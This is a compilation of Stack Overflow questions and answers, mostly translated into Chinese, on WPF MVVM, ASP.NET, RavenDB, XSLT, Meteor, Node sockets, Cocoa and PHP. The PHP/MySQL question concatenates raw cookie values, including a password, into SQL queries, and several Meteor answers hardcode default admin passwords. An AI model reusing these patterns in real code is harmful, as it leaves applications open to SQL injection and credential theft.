            new HomePage() { PageTitle = "This is the Home Page."});
    }

    private void LoadSettingsPage()
    {
        CurrentViewModel = new SettingsPageViewModel(
            new SettingsPage(){PageTitle = "This is the Settings Page."});
    }
} 
```

And finally, we need to override the application startup so that we can load our MainWindowViewModel class into the DataContext property of the MainWindow.

**App.xaml.cs**

```
public partial class App : Application
{
    protected override void OnStartup(StartupEventArgs e)
    {
        base.OnStartup(e);

        var window = new MainWindow() { DataContext = new MainWindowViewModel() };
        window.Show();
    }
} 
```

It would also be a good idea to remove the `StartupUri="MainWindow.xaml"` code in the App.xaml Application tag so that we don't get 2 MainWindows on start up.

Note that the DelegateCommand and ViewModelBase classes that just can be copied into new projects and used. This is just a very simple example. You can get a better idea from [here](https://rachel53461.wordpress.com/2011/05/08/simplemvvmexample/) and [here](http://msdn.microsoft.com/en-us/magazine/dd419663.aspx)

**Edit** In your comment, you wanted to know if it is possible to not have to have a class for each view and related boilerplate code. As far as I know, the answer is no. Yes, you can have a single gigantic class, but you would still need to call OnPropertyChanged for each Property setter. There are also quite a few drawbacks to this. Firstly, the resulting class would be really hard to maintain. There would be a lot of code and dependencies. Secondly, it would be hard to use DataTemplates to "swap" views. It is still possible by using a x:Key in your DataTemplates and hardcoding a template binding in your usercontrol. In essence, you aren't really making your code much shorter, but you will be making it harder for yourself.

I'm guessing your main gripe is having to write so much code in your viewmodel to wrap your model properties. Have a look at [T4 templates](http://msdn.microsoft.com/en-us/library/vstudio/bb126445.aspx). Some developers use this to auto-generate their boilerplate code (i.e. ViewModel classes). I don't use this personally, I use a custom code snippet to quickly generate a viewmodel property.

Another option would be to use a MVVM framework, such as Prism or MVVMLight. I haven't used one myself, but I've heard some of them have built in features to make boilerplate code easy.

Another point to note is: If you are storing your settings in a database, it might be possible to use an ORM framework like Entity Framework to generate your models from the database, which means all you have left is creating the viewmodels and views.

# c# - HttpContext.Server 似乎为空

> ID：15936435
> 
> 赞同：0
> 
> 时间：2013-04-10T21:08:08.963
> 
> 标签：c#, asp.net-mvc

我的 .NET MVC 应用程序的控制器的构造函数中有以下代码行。

```
 _mediaDir = HttpContext.Server.MapPath("~/media"); 
```

当调试器命中这一行时，它会引发异常。

```
A first chance exception of type 'System.NullReferenceException' occurred in OBXCart.dll 
```

我认为 HttpContext 为空，但我不知道为什么。任何人都可以对此有所了解吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:15:10.573

尝试这个...

```
_mediaDir = HttpContext.Current.Server.MapPath("~/media"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:12:45.630

您可以改用 HostingEnvironment.MapPath() 。请在[VS 2012 & IIS Express 上查看我的回答。找不到路径“C:\Program Files (x86)\IIS Express\~\MyPics\My.jpg”的一部分](https://stackoverflow.com/questions/15863725/vs-2012-iis-express-could-not-find-a-part-of-the-path-c-program-files-x86/15864084#15864084)和其中的链接。

# c# - 单独的文档与 Map/Reduce

> ID：15936437
> 
> 赞同：0
> 
> 时间：2013-04-10T21:08:08.333
> 
> 标签：c#, mapreduce, ravendb

给定以下实体

```
public class Device
{
    public string Id { get; set; }
}

public class User
{
    public string Id { get; set; }

    public IList<Device> Devices { get; set; }
} 
```

我需要通过 id 查询设备。设备 ID 是唯一的。设备始终属于一个用户。

我应该将设备也存储为单独的文档，还是对用户“好的”地图缩减功能？我需要经常访问特定设备（中间可能有缓存但仍然存在）？

任何提示或建议或最佳实践？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-11T07:37:44.170

如果您将设备作为单独的文档存储在它们自己的集合中，则根本不需要查询，因为您知道它们的 ID。您可以只使用应该更快的 Load 方法。

如果您确实将它们存储为单独的文档，则需要考虑删除和更新的一致性，例如，如果设备被删除，您需要确保您还找到了拥有该设备的所有用户并删除了引用。

在用户上创建 map-reduce 索引是没有意义的。将reduce函数视为map函数输出的group by。map 函数和reduce 函数的输出形状也必须相同。您会根据什么对用户进行分组以获取设备索引？

但另一方面，如果您仅将它们存储在用户身上，您可以在用户索引中为设备 ID 创建一个字段，然后查询具有特定设备 ID 的用户，并从用户文档。

```
public class UsersIndex: AbstractIndexCreationTask<User>
{
    public UsersIndex()
    {
        Map = docs=> from doc in docs
                     select new 
                     { 
                         DeviceIds = doc.Devices.Select(x => x.Id)
                     };
    }
}

var device = DbSession.Advanced.LuceneQuery<User, UsersIndex>()
                      .WhereEquals("DeviceIds", 123)
                      .Select(x => x.Devices.SingleOrDefault(d => d.Id == 123)); 
```

# twitter-bootstrap - jquery 选择的插件显示内部框架

> ID：15936439
> 
> 赞同：0
> 
> 时间：2013-04-10T21:08:08.460
> 
> 标签：twitter-bootstrap, jquery-chosen

我目前面临使用通过引导程序选择的 jquery 插件的问题。我有一个带有两个选项卡的页面，第一个选项卡有一个选中的启用下拉菜单，下面有 3 个字段。这个下拉菜单工作得很好。

但是，在第二个选项卡上，jquery 选择的插件没有正确显示。我试图在下面附上截图来解释异常行为。有任何想法吗 ？

![工作示例](https://i.stack.imgur.com/lZojC.png)

请注意最右侧的滚动条，这使它看起来很尴尬且难以滚动。下拉列表下方的整个页面是空的，但滚动条只覆盖了大约 50px ..

![不工作的例子](https://i.stack.imgur.com/dZ3iZ.png)

有没有人早点看到过这个？任何建议/解决方案。注意：jquery 插件和引导 css 已经包含在选择的 css 和选择的 js 之前。

谢谢， 卡迪尔

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-06-28T15:52:41.650

我使用选择的内部选项卡遇到了同样的问题。出现滚动是因为`<div class="tab-content">`在引导 css 中溢出设置为自动。`overflow: auto;`使用滚动显示内容（更多关于[w3schools](http://www.w3schools.com/cssref/pr_pos_overflow.asp)的溢出属性）

如下更改 tab-content div 为我解决了这个问题：

```
<div class="tab-content" style="overflow: visible;"> 
```

# javascript - 当画布中有另一个图像时，无法将画布转换为图像

> ID：15936446
> 
> 赞同：0
> 
> 时间：2013-04-10T21:08:25.840
> 
> 标签：javascript, html, dom

我想导出 Raphael -> PNG。实际上，我必须编写自己的函数来解析 DOM 对象。

我的画布有效，但使用 toDataUrl() 的转换并不总是有效。我来看看，如果画布上有图像，那么画布不会导出，否则会导出。

有人熟悉这个吗？有解决方法吗？

# xml - XSLT - 来自不同子元素的链接属性

> ID：15936447
> 
> 赞同：0
> 
> 时间：2013-04-10T21:08:32.510
> 
> 标签：xml, xslt, linked-list

我有以下存储电影和演员的 XML 文件：

```
<database
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:noNamespaceSchemaLocation="movies.xsd">
    <movies>
        <movie movieID="1">
            <title>Movie 1</title>
            <actors>
                <actor actorID="1"></actor>
                <actor actorID="2"></actor>
            </actors>
        </movie>
    </movies>

    <actors>
        <actor actorID="1">
            <name>Bob</name>
        </actor>
        <actor actorID="2">
            <name>Mike</name>
        </actor>
    </actors>
</database> 
```

我想将 actorID from`database/movies/movie/actors/actor`与 actorID from连接起来`database/actors/actor`并显示演员的姓名：

这是我的 XSLT：

```
<xsl:variable name="selectActors" select="database/actors/actor[@actorID]"/>
<xsl:variable name="inputRoot" select="/"/>

<xsl:template match="/">
    <xsl:apply-templates select="database/movies/movie"/>
</xsl:template>

<xsl:template match="movie">
        Title:
        <xsl:value-of select="title"/>
        <br/>
        Actors:
        <xsl:for-each select="actors/actor[@actorID=$selectActors]">
            <xsl:value-of select="$inputRoot/database/actors/actor/name"/>
            <br/>
        </xsl:for-each>
        <br/>
</xsl:template> 
```

这是我要显示的最终结果：

```
Title: Movie 1
Actors: Bob
    Mike 
```

我无法让演员姓名显示在我的页面上。我不确定我是否正确地关联了我的 actorID，因为我通常对 XSLT 很陌生。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T22:07:20.903

`for-each`您的 XPath和您的 XPath 存在问题，`value-of`但比您尝试使用密钥的方法更有效（也更优雅）：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes" omit-xml-declaration="yes"/>
  <xsl:key name="kActor" match="database/actors/actor" use="@actorID"/>

  <xsl:template match="/">
    <div>
      <xsl:apply-templates select="database/movies/movie"/>
    </div>
  </xsl:template>

  <xsl:template match="movie">
    <xsl:value-of select="concat('Title: ', title)"/>
    <br />
    <xsl:text>Actors: </xsl:text>
    <xsl:apply-templates select="key('kActor', actors/actor/@actorID)" />
    <br />
  </xsl:template>

  <xsl:template match="actor">
    <xsl:value-of select="name"/>
    <br />
  </xsl:template>
</xsl:stylesheet> 
```

在您的示例输入上运行时，结果是：

```
<div>
  Title: Movie 1<br />Actors: Bob<br />Mike<br /><br />
</div> 
```

为了让您可以看到您的 XPath 有什么问题，您可以通过以下方式修复现有解决方案以使其正常工作：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" indent="yes" omit-xml-declaration="yes"/>
  <xsl:variable name="selectActors" select="database/actors/actor"/>

  <xsl:template match="/">
    <div>
      <xsl:apply-templates select="database/movies/movie"/>
    </div>
  </xsl:template>

  <xsl:template match="movie">
    Title:
    <xsl:value-of select="title"/>
    <br/>
    Actors:
    <xsl:for-each
      select="$selectActors[@actorID = current()/actors/actor/@actorID]">
      <xsl:value-of select="name"/>
      <br/>
    </xsl:for-each>
    <br/>
  </xsl:template>
</xsl:stylesheet> 
```

# node.js - 如何在流星上创建默认用户？

> ID：15936457
> 
> 赞同：15
> 
> 时间：2013-04-10T21:09:01.750
> 
> 标签：node.js, meteor

如果不存在用户，我想创建一个管理员用户。我在服务器文件夹中的 js 文件上尝试过

```
Meteor.startup(function () {
  if(!Meteor.users.find().count()) {
    var options = {
      username: 'admin', 
      password: 'default-password', 
      email: 'admin@example.com'
    };
    Accounts.createUser(options);
  }
}); 
```

这是流星在控制台上显示的错误

```
Error
    at app/packages/livedata/livedata_common.js:143:26
    at /Users/camilo/Documents/Proyectos/IM/interno/.meteor/local/build/server/server.js:282:7
    at Array.forEach (native)
    at Function._.each._.forEach (/Users/camilo/.meteorite/meteors/meteor/meteor/0ffea1c4c308ed24906984f99b13b8fca5a0956c/dev_bundle/lib/node_modules/underscore/underscore.js:79:11)
    at run (/Users/camilo/Documents/Proyectos/IM/interno/.meteor/local/build/server/server.js:227:7)
=> Exited with code: 1 
```

我做错了什么或者这是一个流星虫？

我正在使用流星 0.6.1 和 node.js 0.9.9

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2013-07-09T20:32:52.140

我会建议一个 /server/fixtures.js 文件。在此文件中，您可以添加默认用户创建，如下所示：

```
if ( Meteor.users.find().count() === 0 ) {
    Accounts.createUser({
        username: 'username',
        email: 'email',
        password: 'asdfasdf',
        profile: {
            first_name: 'fname',
            last_name: 'lname',
            company: 'company',
        }
    });
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-11T06:27:28.120

这种方式对我有用：

```
var users=[
   {email: "dgra@gmail.com", username: "gra", name: "gra", roles:['admin']}
];
_.each(users, function(user){
    Accounts.createUser({
        email: user.email,
        password: "admin",
        profile: {username: user.username},
        profile: {name: user.name},
        roles: user.roles
    });
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-17T01:27:09.850

我从未发现在 Meteor 上创建用户有任何问题。这是我的咖啡脚本代码：

```
Meteor.startup ->
  if Meteor.users.find.count() is 0
    options =
      email: 'email@example.com'
      password: 'pass'
    Accounts.createUser(options) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-06-28T23:00:16.657

一段时间后，我用流星 0.6.4 再次测试了上面的代码，它没有问题。可能是流星 0.6.1 的问题，或者我不小心在代码中的某个地方解决了这个问题。

# php - 与 Softaculous AMPPS 一起运行 Zend Server？

> ID：15936459
> 
> 赞同：4
> 
> 时间：2013-04-10T21:09:09.117
> 
> 标签：php, apache, zend-server, softaculous

我目前使用 Softaculous AMPPS 进行大部分本地服务器测试。但是，我想看看我是否可以在相同的 AMPPS Apache 安装下安装和运行 Zend Server 而不会中断任何东西。

我真的很想要 Zend Server 提供的 Zend Optimizer、Loader 和其他高级调试功能，但 AMPPS 易于扩展和配置。

这可能吗？如果是这样，您会建议什么来实现这一目标？

我在 Windows 8 上。

# javascript - 如何在nodejs中可靠地维护一组连接的套接字？

> ID：15936462
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:17.500
> 
> 标签：javascript, node.js, sockets, concurrency

想象一个 Web 套接字服务器。当我收到一个连接时，我需要将该连接保存在它所属的池中（将池视为“对等点”的“房间”）。这是必需的，因为我需要向同一个池的对等方广播内容。

代码 - 当然 - 全部是异步的，即使 Node 是单线程的，维护一个全局数组似乎也不可靠（虽然我不确定这是怎么可能的......）：在压力测试期间，使用消息流向服务器的速度非常快，我将连接保存在结构中，但通常下一条消息没有发现该结构（仍然？）更新，行为不规律。

应用使用Redis，但是socket不能序列化...

通信基于 WebSockets，通过 SockJS（我在之前的迭代中使用了 Socket.io）。

我确定这是一个众所周知且已经解决的问题，但我仍然没有看到光明：我在这里缺少什么？

我的 Sessions 对象或多或少是这样的（不仅仅是一个伪代码......它比这复杂得多）。

```
var Sessions = {

   sockets: {},

   add: function(poolId, socket) {
     sockets[poolId].push(socket);
   },

   find: function(poolId) {
     return sockets[poolId];
   },

   remove: function ...

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T22:44:54.903

我不确定我是否理解您遇到的确切问题，但这里有一个维护套接字池的服务器示例。连接后，套接字可以发送仅广播到其分配的池的消息，这就是我相信您正在尝试完成的事情。此外，当客户端断开连接时，它会将自身从池中删除。

```
var net = require('net'); 
var util = require('util');

var currentPool = 1;
var server = net.createServer();

//add a new socket to the assigned pool stored on the listening server instance
server.addToPool = function(s){
  if(!server.connPools){
    server.connPools = {};
  }

  if(!server.connPools[s.poolId]){
    server.connPools[s.poolId] = [];
  }

  server.connPools[s.poolId].push(s);

  s.on('close', clientCloseHandler);
  s.on('data', clientDataHandler);

};

//broadcast data from client to other clients in their pool
function clientDataHandler(data){

  for(var a=0; a < server.connPools[this.poolId].length; a++){
    server.connPools[this.poolId][a].write(data);
  }

}

//remove client form pool on disconnect
function clientCloseHandler(){
  var tmp = null;
  for(var a=0; a < server.connPools[this.poolId].length; a++){
    if(this.remotePort === a.remotePort){
      tmp = a;
      break;
    }
  }
  server.connPools[this.poolId].splice(tmp,1);
}

//add new client to pool
function newClient(s){
  s.poolId = currentPool;
  server.addToPool(s);

  if(currentPool === 1){
    currentPool = 2;
  }else{
    currentPool = 1
  }

}

server.on('connection', newClient);

server.listen(9999); 
```

# linux - Linux系统（“top -p pid”）程序中的命令

> ID：15936465
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:05.927
> 
> 标签：linux

我有一个 Linux 程序，其中穿插着对系统 API 的调用，特别是`system("top")`，因此我可以在程序的各个点监视虚拟内存。我打印了 4 次内存统计信息，并尝试在这些调用之间打印其他数据。

但是，当我的程序完成时，看起来好像`top`命令正在刷新页面，所以我需要打印的其他数据被删除了。我尝试添加一些迭代，如中，`system("top -p pid -n 1)`但我遇到了同样的问题。

有没有办法`top`在 Linux 中调用不刷新输出缓冲区？我不知道还能转向哪里。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:13:37.810

您可以自己打开 /proc 中的相关文件，并根据需要显示信息。

# cocoa - 如何控制模式对话框的选项卡顺序（键视图循环）？runModalForWindow：忽略 nextKeyView

> ID：15936466
> 
> 赞同：4
> 
> 时间：2013-04-10T21:09:08.390
> 
> 标签：cocoa, tabs, modal-dialog

除非我完全感到困惑，否则似乎`runModalForWindow:`忽略`nextKeyView`了 NSPanel 中字段的属性。

```
#define RUN_MODAL 1
#if RUN_MODAL
    [ NSApp runModalForWindow: self.view.window ] ;
#else
    [ self.view.window makeKeyAndOrderFront: nil ] ;
#endif 
```

我已经尝试了两种方式，并且在使用正常时我肯定会得到正确的标签顺序，`makeKeyAndOrderFront:`而在使用`runModalForWindow:`.
我错过了什么吗？或者有人知道如何在运行模态时使其工作？

根据建议，我尝试了以下方法并得到了相同的结果：

```
#define RUN_MODAL 1
#if RUN_MODAL
#define USE_BEGINSHEET 1
#if USE_BEGINSHEET
    [ NSApp beginSheet: self.view.window
        modalForWindow: nil
         modalDelegate: nil
        didEndSelector: NULL
           contextInfo: NULL ];
#else
    [ NSApp runModalForWindow: self.view.window ] ;
#endif
#else
    [ self.view.window makeKeyAndOrderFront: nil ] ;
#endif 
```

请注意，“文档窗口”是`nil`因为这是一个主要是背景无 UI 的应用程序，有时只是弹出一个登录对话框。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-06-05T21:17:49.747

原来是在 Interface Builder 的 Attributes Inspector 的 Window 部分中的 Auto Recalculates View Loop 复选框。它默认为选中，但在模式对话框中，如果任何字段被动态启用/禁用（例如，通过绑定），则重新计算平底船到“几何”（从左到右，从上到下）顺序。

我相信以编程方式对应于`autorecalculatesKeyViewLoop`NSWindow 的属性（在我的情况下是 NSPanel）。

# ajax - 表单提交问题

> ID：15936467
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:01.010
> 
> 标签：ajax, forms, submit

我正在开发一个 ASP.Net MVC 应用程序，并且我的表单包含一个文件上传 HTML 元素和一个提交按钮。当用户第一次进入视图时，我有 javascript 代码自动触发文件上传 HTML 元素上的单击事件，因此用户不必自己按下按钮。这是为了方便和我想要的方式，但是当我自动触发按钮单击时，它会导致以下问题：我必须按两次提交按钮才能提交表单。第一次按下清除文件上传 HTML 元素中的文本，第二次按下提交表单。谁能解释为什么会发生这种情况以及我怎样才能让它不这样做？

注意：表单明确设置为不使用 Ajax，因为我正在上传图像，据我了解，您无法通过 Ajax 上传图像，因此我在表单 HTML 属性中使用 data-ajax = "false" 将其关闭。将此设置为 false 与我遇到的问题有关。如果我通过 ajax 提交，我只需要按一次提交按钮。如果我不使用ajax，我需要按两次。

这是显示问题的基本代码：

```
@Using Html.BeginForm("Document", "NewDocument", Model, FormMethod.Post, New With {.enctype = "multipart/form-data", .data_ajax = "false", .id="submitimage-form"})

@<input type="file" id="fileInput" name="fileInput" style="visibility:hidden;" />   

@<input type="submit" id="accept2" value="Accept" data-mini="true" data-theme="b" data-icon="check"/>
End Using

<script>

// Do once after DOM is loaded for the page
$(document).bind("pageinit", function () {
    $("#fileInput").click();
});

</script> 
```

# php - PHP MySQL第二次查询失败

> ID：15936468
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:30.580
> 
> 标签：php, mysql

似乎我的第二个 MySQL 查询由于未知原因而失败。连接时我没有遇到问题，只有在从 $dbLink->query(); 获取结果时才会出现问题。

```
$photos = getPhotos(getID($_COOKIE[$uname_cookie], $_COOKIE[$passwd_cookie]));

function getID($uName, $passwd) {
    // Just in case, for modularity :P
    include 'misc.php';
    $query = "SELECT ID FROM Users WHERE UserName = '" . $uName . "' AND Password = '" . $passwd . "';";
    $dbLink = new mysqli($host, $user, $pass, $dbname);
    if ($dbLink->connect_errno) {
        echo "Failed to connect to database: " . $dbLink->connect_error;
        return null;
    } else {
        $results = $dbLink->query($query);
        print_r($results->fetch_array());
        $rows = $results->fetch_array();
        return $rows["ID"];
    }
}

function getPhotos($id) {
    // Just in case, for modularity :P
    include 'misc.php';
    $query = "SELECT Location FROM Photos WHERE UserID = " . $id . ";";
    $dbLink = new mysqli($host, $user, $pass, $dbname);
    if ($dbLink->connect_errno) {
        echo "Failed to connect to database: " . $dbLink->connect_error;
        return null;
    } else {
        $results = $dbLink->query($query);
        print_r($results->fetch_array());
        $rows = $results->fetch_array();
        return $rows["ID"];
    }
} 
```

编辑：通过将 $dbLink 传递给函数 IE getPhotos($id, $dbLink) 得到它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-10T21:21:05.167

```
$query = "SELECT Location FROM Photos WHERE UserID = '" . $id . "';"; 
```

# haskell - 从 ghci 中调用“gnuplot”会破坏终端。有可能恢复吗？

> ID：15936469
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:32.440
> 
> 标签：haskell, ghci

例如，请参阅此会话：

```
Prelude> import System.Process
Prelude System.Process> system "gnuplot filename.gnu"
Prelude System.Process> 
```

现在，每当我在终端输入时，什么都不会出现。（奇怪的是，输入仍然像往常一样被读入。你可以输入一个命令，按回车，结果就会出现。）我必须重新启动 ghci 才能让它再次工作。

我可以调用一些命令来重置 ghci 而不重新启动它吗？或者，有没有更好的方法来调用 gnuplot 以便它不会干扰？

编辑：这是 ghc 7.6.2

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-07T21:02:50.283

你可以试试这个：

```
Prelude> import System.Process
Prelude System.Process> system "gnuplot filename.gnu"
Prelude System.Process> system "reset" 
```

通常`reset`可以在这里找到命令：

```
$ which reset
/usr/bin/reset 
```

# android - 如何在 AlertDialog 中调用 AlertDialog？

> ID：15936475
> 
> 赞同：0
> 
> 时间：2013-04-10T21:09:52.227
> 
> 标签：android, android-alertdialog

我有这个代码：

```
public class Example
{
 String sp,st;
 SQLiteDatabase database, database2;
 void func()
 {
 new AlertDialog.Builder(view.getContext())
    .setIcon(android.R.drawable.ic_dialog_alert)
    .setTitle("Confirm")
    .setMessage("Are you sure?")
    .setPositiveButton("Yes", new DialogInterface.OnClickListener()
    {
    @Override
    public void onClick(DialogInterface dialog, int which) {
      String st = editTextSt.getText().toString();
      String sp = editTextSp.getText().toString();
      database2 = new SQLiteDbHelper(this);
      database = database2.getWritableDatabase();
      ContentValues values = new ContentValues();
      values.put(SQLiteDbHelper.COLUMN_NAME_SP, sp);
      values.put(SQLiteDbHelper.COLUMN_NAME_ST, st);
      long insertId = database.insert(SQLiteDbHelper.TABLE_NAME, null, values);
      //I would like to call it here
    }})
    .setNegativeButton("No", null)
    .show();

 } 
```

我想在上面的 AlertDialog 中调用这个 AlertDialog：

```
new AlertDialog.Builder(this)
                .setMessage("Saved!")
                .setNeutralButton("OK", null)
                .show(); 
```

我该怎么做？

如果我只是把它放在我想要的地方，我会收到“构造函数 AlertDialog.Builder(new DialogInterface.OnClickListener(){}) 未定义”的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-10T21:14:05.317

**试试这个**：

```
new AlertDialog.Builder(Example.this)
                .setMessage("Saved!")
                .setNeutralButton("OK", null)
                .show(); 
```

假设该类`Example`是一个`Activity`.

**即**：

```
public class Example extends Activity 
```

**否则，使用这个**：

```
new AlertDialog.Builder(view.getContext())
                .setMessage("Saved!")
                .setNeutralButton("OK", null)
                .show(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-10T21:16:26.153

一旦您进入 ClickListener 对象`this`，它将引用该对象，而不是像它在外面所做的那样`Example`的活动，假设它可能不是基于您的代码的活动。

要修复它，您只需要使用不同的方式来获取上下文以传递给您的构建器构造函数。

要创建您使用的第一个构建器，您可以这样做：

```
new AlertDialog.Builder(view.getContext()) 
```

用于`view.getContext()`获取您需要的上下文。您应该能够以与您的第二个构建器相同的方式进行操作。

# c# - C# 使用集合时线程安全的最佳实践（尚未并发）

> ID：15936476
> 
> 赞同：3
> 
> 时间：2013-04-10T21:09:51.843
> 
> 标签：c#, multithreading, collections, synchronization, thread-safety

我的问题更像是我想与其他人确认的问题，所以我确信我得到了正确的答案。当您想要进行非线程安全操作（例如枚举集合）时，最好的办法是调用 Synchronized 方法（如果该集合存在）。

例如：`var syncAL = ArrayList.Synchronized( myAL );`

然后你可以毫无顾虑地做一些事情：

```
foreach (var item in syncAL){
  // Do something
} 
```

现在我个人并没有真正使用 ArrayLists，它只是为了示例，但是对于常规 List，Synchronized 方法不存在，所以这里的最佳做法是：

```
lock (list.SyncRoot){
 // non thread-safe operation, e.g:
 list.ForEach(item => Console.WriteLine(item.ToString()));
} 
```

因为当然你可以创建你自己的任意对象，但是如果你在多个类中使用一些集合对象，你需要确保你使用同一个对象来锁定所有这些类，这似乎喜欢一种非常舒适的方式。

我想确保它确实是最佳实践，并且在添加我写的内容作为我的团队的开发技巧之前我没有遗漏任何东西:)

我对此的理解来源： [MSDN SyncRoot](http://msdn.microsoft.com/en-us/library/system.collections.icollection.syncroot.aspx)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T21:40:19.027

> > 然后你可以毫无顾虑地做一些事情：

```
foreach (var item in syncAL){
  // Do something
} 
```

没有。来自[MSDN](http://msdn.microsoft.com/en-us/library/3azh197k.aspx)：

> > 通过集合进行枚举本质上不是线程安全的过程。即使一个集合是同步的，

对于核心问题：

> 我想确保这确实是最佳实践

不，这是一种过时的做法。请注意，SyncRoot 仅限于`ICollection`，并且不支持`ICollection<T>`. 较新的集合 ( `List<>`) 不支持它，这是您的主要线索。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-10T21:36:58.477

在 ArrayList.Synchronized 包装器中包装集合不会使枚举线程安全，[MSDN](http://msdn.microsoft.com/en-US/library/3azh197k.aspx)明确指出：

*...即使一个集合被同步，其他线程仍然可以修改该集合，这会导致枚举器抛出异常。*

所以最好的方法仍然是锁定 SyncRoot，或者使用 System.Collections.Concurrent 命名空间中的线程安全集合。

ArrayList.Synchronized 的内部实现只会创建内部类 SyncArrayList 的实例，它将锁定 SyncRoot 以进行任何操作，如下所示：

```
 public override int Add(object value)
  {
    lock (this._root)
      return this._list.Add(value);
  } 
```

# php - 无法在 php 代码中使用 HTML 符号

> ID：15936479
> 
> 赞同：-3
> 
> 时间：2013-04-10T21:10:11.487
> 
> 标签：php, html, wordpress, title, html-entities

我创建了一些代码放在`<title>`我的 Wordpress 网站的标签中，根据访问者所在的页面来回显某个标题。这是代码：

```
<title>
    <?php if ( is_page('144')) { bloginfo('name'); } else { wp_title(''); bloginfo('name'); } ?>
</title> 
```

现在我想在 php 代码中的页面标题和博客名称之间放置一个空格或竖线 (|)，但我无法这样做。我尝试使用`&nbsp;`并`&#124;`喜欢这样：

```
<title>
    <?php if ( is_page('144')) { bloginfo('name'); } else { wp_title('');&#124;bloginfo('name'); } ?>
</title> 
```

但它返回一个错误说`Parse error: syntax error, unexpected '&'`。

想问问有没有什么办法可以解决这个问题，期待高手的解答，谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-10T21:12:28.297

使用`echo "|"`代替`&#124`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-10T21:12:44.187

`echoing`您收到此错误是因为您不是`space`or `pipe`：

```
<title><?php
if ( is_page('144')) { 
    bloginfo('name');
} else {
    wp_title('');
    echo '|';
    bloginfo('name'); 
}
?></title> 
```

或者，您可以使用`get_`wordpress 使用的前缀并像这样连接字符串：

```
echo get_the_title().'|'.get_bloginfo('name'); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-10T21:13:32.880

尝试：

```
 echo '|'; 
```

如果要输出文本，则需要回显

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-10T21:14:02.590

中的所有内容`<?php .... ?>`都必须是有效的 PHP 代码。 `&nbsp;`并且`&#124;`是 HTML，而不是 PHP。如果你想在中间写 HTML，你必须在 PHP 段结束后`?>`重新开始`<?php`。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2013-04-10T21:12:47.663

您需要使用回声或打印。

```
<title> <?php if ( is_page('144')) {  bloginfo('name'); } else {  wp_title(''); echo '&#124'; bloginfo('name'); } ?> </title> 
```

# css - twitter bootstrap主题中项目之间的间距问题

> ID：15936481
> 
> 赞同：-3
> 
> 时间：2013-04-10T21:10:16.160
> 
> 标签：css, html, twitter-bootstrap

我在标题文本的正下方有一个固定宽度的容器，它在页面上放置一个滑块，一旦我把它做成一个流体容器，这样它就可以跨越页面的宽度，它最终会向下移动很多。

我已经尝试在流体容器的 margin-top 和 padding-top 中添加像素，尽管它似乎没有将它向上移动。

我似乎无法弄清楚如何删除空间，希望有人能提供帮助。

**编辑：**这是页面[http://goo.gl/8JUDA的链接](http://goo.gl/8JUDA)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-10T21:17:48.770

滑块上方有相当多的元素不显示任何内容，但有助于空间。最多的是由和类添加`padding:40px 0 0 0;`的，但您也有一些段落容器，这也可能会增加一些空间。`.hero-unit``padding-bottom:40px``.homepage`

但是......填充参数将**相对定位**的容器向下推。在文件中查找它们：

[http://development.ugamer.tv/wp-content/themes/rachelbaker-bootstrapwp-Twitter-Bootstrap-for-WordPress-9bc2021/style.css](http://development.ugamer.tv/wp-content/themes/rachelbaker-bootstrapwp-Twitter-Bootstrap-for-WordPress-9bc2021/style.css)

修复这些应该有效。

* * *

另外......这是一个断开的链接：

```
<link rel='stylesheet' id='ugamer-css'  href='http://development.ugamer.tv/wp-content/themes/rachelbaker-bootstrapwp-Twitter-Bootstrap-for-WordPress-9bc2021style.css?ver=0.90' type='text/css' media='all' /> 
```

# vba - VBA从文档中的数据创建另存为文件名

> ID：15936482
> 
> 赞同：2
> 
> 时间：2013-04-10T21:10:26.130
> 
> 标签：vba, ms-word

我在 MSWord 中有一个包含名称、日期和非数字数据的表。我想编写一个宏来提取这些数据并使其成为当用户点击另存为时，建议的文件名以特定顺序排列数据，以句点分隔。

表格如下所示：

第一栏：

```
Date     04/10/13
Name 1   Arthur Z
Name 2   Bea Y
Title 1  Cars 
```

第二栏：

```
Title 2  Boats
Company  Burger King
Color    Red
Name 3   Caroline X 
```

我需要文件名采用以下格式：

```
Burger King.Red.Y.Bea.04-10-13.Arthur Z.(extension) 
```

我的代码：

```
Sub FileSaveAs()
   ActiveDocument.Fields.Update
   ActiveDocument.Fields.Update

   'Updated twice because some of the fields that need 
   'to be updated rely on fields below it and since it 
   'doesn't take too long I didn't bother figuring out 
   'how to make it update backwards--but if anyone knows 
   'how, please lmk
    Dim r As Range
    Set r = ActiveDocument.Range
    Dim fld As Field
